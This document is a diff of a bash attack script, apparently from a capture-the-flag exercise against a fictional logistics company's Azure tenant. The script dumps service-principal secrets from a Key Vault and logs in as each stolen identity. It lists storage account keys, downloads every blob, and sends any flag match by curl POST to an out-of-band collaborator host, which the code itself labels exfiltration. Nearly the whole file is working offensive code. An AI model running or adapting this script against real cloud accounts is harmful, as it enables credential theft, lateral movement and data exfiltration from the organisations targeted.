@@ -1,12 +1,12 @@
 #!/usr/bin/env bash
-# Tebamoto Logistics - step 5, run 6.
-# Run 5 found sync-service-principal can list account keys on sttblcilogsprodx3euoz,
-# but every download returned 0 bytes: `--file /dev/stdout -o none` does not emit.
-# Fix: download to a real file and read it. Also report per-account why key listing fails.
+# Tebamoto Logistics - step 5, run 7.
+# Run 6 bug: a FAILED `az storage account keys list` returns an error string longer than
+# 40 chars, so the `${#K} -ge 40` test accepted it as a key and every call died with
+# "the given account key may be not valid" - AAD mode was never attempted. Fix: validate
+# that the key is actually base64, and try BOTH modes per account regardless.
 #
-# The 'loot' container holds other teams' exfil output (mi_loot_*.json, z_probe_marker.json,
-# probe.txt ...). We pattern-match it for DF26{...} but never print or store its contents -
-# finding someone else's answer there is not solving this.
+# Remaining ground: config (sttblappcfgprod), exports (sttblbackupprod), sttblarchiveprod.
+# 'loot' is other teams' dumping ground - matched but never shown, and never claimed.
 #
 # Read-only, scoped to rg-tbl-platform-prod-sea. No secret value echoed; flag goes OOB only.
 set -uo pipefail
@@ -17,43 +17,46 @@ SRC_VAULT="kv-tbl-prod-x3euoz"
 FLAGRE='DF26\{[^}]+\}'
 FOUND=""; FOUND_AT=""
 WORK=$(mktemp -d); DL=$(mktemp -d)
-
 say() { echo "[*] $*"; }
 
-scan_account() {              # $1=account  $2=label of current identity
-  local A="$1" WHO="$2" K AUTH M CL BL D SZ MM
-  K=$(az storage account keys list -n "$A" -g "$RG" --query "[0].value" -o tsv 2>&1)
-  if [ ${#K} -ge 40 ]; then AUTH=(--account-key "$K"); M=key
-  else AUTH=(--auth-mode login); M=aad; fi
+valid_key() { [[ "$1" =~ ^[A-Za-z0-9+/]{60,}={0,2}$ ]]; }
+
+scan() {                       # $1=account $2=identity-label $3=mode-label $4..=auth args
+  local A="$1" WHO="$2" M="$3"; shift 3
+  local AUTH=("$@") CL BL SZ MM
   CL=$(az storage container list --account-name "$A" "${AUTH[@]}" --query "[].name" -o tsv 2>&1)
-  if grep -qiE 'error|denied|forbidden|permission' <<<"$CL"; then
-    say "    $A auth=$M containers -> $(head -c 110 <<<"$CL" | tr -d '\n')"; return 0
+  if grep -qiE 'error|denied|forbidden|permission|not valid' <<<"$CL"; then
+    say "    $A[$M] -> $(head -c 95 <<<"$CL" | tr -d '\n')"; return 0
   fi
-  say "    $A auth=$M containers: $(tr '\n' ' ' <<<"$CL" | head -c 120)"
+  say "    $A[$M] containers: $(tr '\n' ' ' <<<"$CL" | head -c 110)"
   for C in $CL; do
     BL=$(az storage blob list --account-name "$A" "${AUTH[@]}" -c "$C" --query "[].name" -o tsv 2>&1)
     if grep -qiE 'error|denied|forbidden|permission' <<<"$BL"; then
-      say "      $C -> $(head -c 110 <<<"$BL" | tr -d '\n')"; continue
+      say "      $C -> $(head -c 95 <<<"$BL" | tr -d '\n')"; continue
     fi
     for B in $BL; do
-      rm -f "$DL/blob"
+      rm -f "$DL/b"
       az storage blob download --account-name "$A" "${AUTH[@]}" -c "$C" -n "$B" \
-         --file "$DL/blob" --overwrite -o none >/dev/null 2>&1
-      [ -f "$DL/blob" ] || { say "      $C/$B -> download failed"; continue; }
-      SZ=$(wc -c <"$DL/blob")
-      MM=$(grep -aoE "$FLAGRE" "$DL/blob" | head -1)
+         --file "$DL/b" --overwrite -o none >/dev/null 2>&1
+      [ -f "$DL/b" ] || continue
+      SZ=$(wc -c <"$DL/b"); MM=$(grep -aoE "$FLAGRE" "$DL/b" | head -1)
       if [ "$C" = "loot" ]; then
-        # other teams' dumping ground: match only, never show content
-        say "      $C/$B size=$SZ flag=${MM:+MATCH}${MM:--} (contents not shown)"
+        say "      $C/$B size=$SZ flag=${MM:+MATCH}${MM:--} (other teams' files - not shown, not claimed)"
       else
         say "      $C/$B size=$SZ flag=${MM:+MATCH}${MM:--}"
+        if [ -n "$MM" ] && [ -z "$FOUND" ]; then FOUND="$MM"; FOUND_AT="$A/$C/$B via $WHO[$M]"; fi
       fi
-      if [ -n "$MM" ] && [ -z "$FOUND" ] && [ "$C" != "loot" ]; then
-        FOUND="$MM"; FOUND_AT="$A/$C/$B ($WHO)"
-      fi
-      [ -n "$MM" ] && [ "$C" = "loot" ] && say "        (match in another team's loot file - ignored)"
     done
   done
+}
+
+scan_both() {                  # $1=account $2=identity-label
+  local A="$1" WHO="$2" K
+  K=$(az storage account keys list -n "$A" -g "$RG" --query "[0].value" -o tsv 2>/dev/null)
+  if valid_key "$K"; then scan "$A" "$WHO" key --account-key "$K"
+  else say "    $A[key] -> no valid key for this identity"; fi
+  [ -n "$FOUND" ] && return 0
+  scan "$A" "$WHO" aad --auth-mode login
 }
 
 federate() {
@@ -69,11 +72,11 @@ federate && say "federated OK" || { say "federated FAILED"; exit 1; }
 for S in $(az keyvault secret list --vault-name "$SRC_VAULT" --query "[].name" -o tsv 2>/dev/null); do
   az keyvault secret show --vault-name "$SRC_VAULT" --name "$S" --query value -o tsv >"$WORK/$S" 2>/dev/null
 done
-say "cached $(ls -1 "$WORK" | wc -l) principals"
 ACCTS=$(az storage account list -g "$RG" --query "[].name" -o tsv 2>/dev/null)
+say "accounts: $(tr '\n' ' ' <<<"$ACCTS")"
 
-say "=== as federated identity ==="
-for A in $ACCTS; do scan_account "$A" "federated"; done
+say "=== federated identity ==="
+for A in $ACCTS; do scan_both "$A" federated; [ -n "$FOUND" ] && break; done
 
 for F in "$WORK"/*; do
   [ -n "$FOUND" ] && break
@@ -83,9 +86,9 @@ for F in "$WORK"/*; do
   TEN=$(jq -r '.tenantId // empty' <"$F")
   az logout >/dev/null 2>&1
   az login --service-principal -u "$CID" -p "$SEC" -t "${TEN:-$AZURE_TENANT_ID}" \
-    --allow-no-subscriptions >/dev/null 2>&1 || { say "=== $S -> login failed"; continue; }
-  say "=== as $S (${CID:0:8}…) ==="
-  for A in $ACCTS; do scan_account "$A" "$S"; [ -n "$FOUND" ] && break; done
+    --allow-no-subscriptions >/dev/null 2>&1 || { say "=== $S login failed"; continue; }
+  say "=== $S (${CID:0:8}…) ==="
+  for A in $ACCTS; do scan_both "$A" "$S"; [ -n "$FOUND" ] && break; done
 done
 
 rm -rf "$WORK" "$DL"
@@ -94,6 +97,6 @@ if [ -n "$FOUND" ]; then
   curl -sS -m 25 -X POST --data-binary "$FOUND" -H 'Content-Type: text/plain' \
     "http://${COLLAB}/flag" -o /dev/null -w '    exfil http=%{http_code}\n' 2>&1
 else
-  say "no match outside loot"
+  say "no match"
 fi
 az logout >/dev/null 2>&1; say "done"
